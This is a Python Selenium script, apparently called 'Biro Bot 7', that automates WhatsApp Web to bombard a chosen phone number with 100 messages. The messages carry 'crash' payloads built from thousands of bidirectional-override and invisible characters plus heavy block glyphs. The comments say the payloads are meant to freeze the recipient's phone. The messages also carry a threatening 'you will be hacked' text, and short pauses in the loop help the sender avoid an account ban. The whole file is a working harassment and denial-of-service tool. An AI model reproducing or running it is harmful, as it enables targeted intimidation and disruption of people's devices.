from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
import time
import os
import pyperclip 
import random
import io
import sys
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    YELLOW = '\033[93m'
    BOLD = '\033[1m'
    END = '\033[0m'
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
def show_banner():
    clear_screen()
    banner = f"""{Colors.RED}{Colors.BOLD}
    
    ██████╗ ██╗██████╗  ██████╗     ██████╗  ██████╗ ████████╗
    ██╔══██╗██║██╔══██╗██╔═══██╗    ██╔══██╗██╔═══██╗╚══██╔══╝
    ██████╔╝██║██████╔╝██║   ██║    ██████╔╝██║   ██║   ██║   
    ██╔══██╗██║██╔══██╗██║   ██║    ██╔══██╗██║   ██║   ██║   
    ██████╔╝██║██║  ██║╚██████╔╝    ██████╔╝╚██████╔╝   ██║   
    ╚═════╝ ╚═╝╚═╝  ╚═╝ ╚═════╝     ╚═════╝  ╚═════╝    ╚═╝   
                                {Colors.CYAN}--- VERSION 7.0 ---{Colors.RED}
                                
    {Colors.YELLOW}>> Status: Multi-Platform (Kali / Termux / Win)
    >> Engine: Selenium Ultra-Crash Protocol
    >> Dev: Marwan Elbadry{Colors.END}
    """
    print(banner)

def main():
    show_banner()
    print(f"{Colors.CYAN}🚀 تجهيز المتصفح ونظام التشفير...{Colors.END}")
    options = webdriver.ChromeOptions()
    current_dir = os.path.dirname(os.path.abspath(__file__))
    session_path = os.path.join(current_dir, "whatsapp_session")
    options.add_argument(f"user-data-dir={session_path}")
    options.add_experimental_option("excludeSwitches", ["enable-logging"])

    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

    driver.get("https://web.whatsapp.com")
    print("📱 لو طلب منك، اعمل Scan للـ QR Code من موبايلك..")
    input("✅ بعد ما المحادثات تظهر، اضغط Enter هنا عشان نبدأ...")
    def generate_crash_payload():
        # رموز بتغير اتجاه النص ورموز مخفية ورموز زخرفة تقيلة
        bidi_chars = ["\u202e", "\u202d", "\u202a", "\u202c", "\u200f"]
        heavy_chars = ["▓", "▒", "░", "█", "█","▌","▌█","▧","█", "☣️", "⚠️", "🚫"]

        # توليد نص عشوائي "ملغم" بطول 2000 حرف
        payload = ""
        for _ in range(2000):
            payload += random.choice(bidi_chars) + random.choice(heavy_chars)
        
        return payload
    def generate_ultra_crash():
        # دي بتعمل "تجميد" لمعالج الرسوميات في الموبايل (GPU)
        # بنستخدم رموز بتخلي المحرك النصي يعيد الحسابات مالا نهاية
        bidi_loop = "\u202d\u202e" * 500 
        invisible_mass = "‏" * 10000 # مساحة وهمية ضخمة جداً
        heavy_symbols = "▓▒░█" * 200
        
        # القنبلة دي بتخلي الموبايل "يفكر" كتير قبل ما يفتح الشات
        return f"{bidi_loop}\n{heavy_symbols}\n{invisible_mass}\n{bidi_loop}"
    def send_scary_msg(phone_number, scary_text, count):
            start_time = time.time() # عشان نحسب الوقت
            print(f"🚀 جاري بدء الهجوم المنظم على {phone_number}...")
            url = f"https://web.whatsapp.com/send?phone={phone_number}"
            driver.get(url) 

            try:
                wait = WebDriverWait(driver, 35)

                chat_box = wait.until(EC.presence_of_element_located((By.XPATH, '//footer//div[@contenteditable="true"]')))
                
                time.sleep(3)
                

                pyperclip.copy(scary_text)

                print(f"🔥 بدأ إرسال الرسالة المرعبة {count} مرة...")

                for i in range(1, count + 1):
                    # توليد الحمولة
                    dynamic_payload = my_msg + "\n" + generate_crash_payload()
                    # التبديل بين النص وبين الـ V-Card عشان نكسر "ذكاء" الموبايل
                    if i % 2 == 0:
                        final_payload = generate_ultra_crash()
                        tag = "V-ATTACK"
                    else:
                        final_payload = my_msg + "\n" + generate_crash_payload()
                        tag = "TEXT"
                    pyperclip.copy(final_payload)

                    # الإرسال
                    chat_box.send_keys(Keys.CONTROL, 'v')
                    chat_box.send_keys(Keys.ENTER)

                    # لمسة "المهندس": Burst Mode
                    if i % 20 == 0:
                        print(f"📦 تم إرسال دفعة من 20 قنبلة.. استراحة قصيرة للـ Buffer")
                        time.sleep(0.1) # استراحة عشان حسابك م يتحظرش
                    
                    # طباعة الحالة بشكل شيك
                    print(f"[{i}/{count}] - القنبلة طارت! 💣")
                end_time = time.time()
                duration = round(end_time - start_time, 2)
                print(f"\n✅ المهمة اكتملت في {duration} ثانية.")
            except Exception as e:
                print(f"❌ حصلت مشكلة: {e}")


    my_msg = """
    ☞ shatafa Contact will be hacked
    You will be hacked By Biro Bot 7 
    "أفجر تهكير في المجال"
    "★彡✦ السراب البعيد ✦彡★"
    "▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓هَهَهَهَهَهَ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒"
    "ﭼهِازﮚﮚ بيتقْيُﮰ▒▒▒▒▒▌▌▌▌"
    "███████████████████████████"
    "███████████████████████████"
    "███████████████████████████"
    "███████████████████████████"
    "███████████████████████████"
    "███████████████████████████"
    "███████████████████████████"
    "███████████████████████████"
    "███████████████████████████"
    "███████████████████████████"
    "███████████████████████████"
    "███████████████████████████"
    ███████████████████████████░░░░░░░░░░░░░░░░░░▓▓▓▓▓▓▓
    ███████████████████████████░░░░░░░░░░░░░░░░░░▓▓▓▓▓▓▓
    ███████████████████████████░░░░░░░░░░░░░░░░░░▓▓▓▓▓▓▓
    ███████████████████████████░░░░░░░░░░░░░░░░░░▓▓▓▓▓▓▓

    "♕『 بيرو المشاكس 』"
    Loading....
    """

    invisible_crash = "‏" * 5000

    target_number = input("enter your number phone > ")
    bomb_payload = (my_msg + "\n" + invisible_crash) * 10

    send_scary_msg(target_number, bomb_payload, 100)

    print("\n🎯 المهمة تمت بنجاح يا هندسة.")
    input("اضغط Enter عشان تقفل المتصفح...")
    driver.quit()

if __name__ == "__main__":
    main()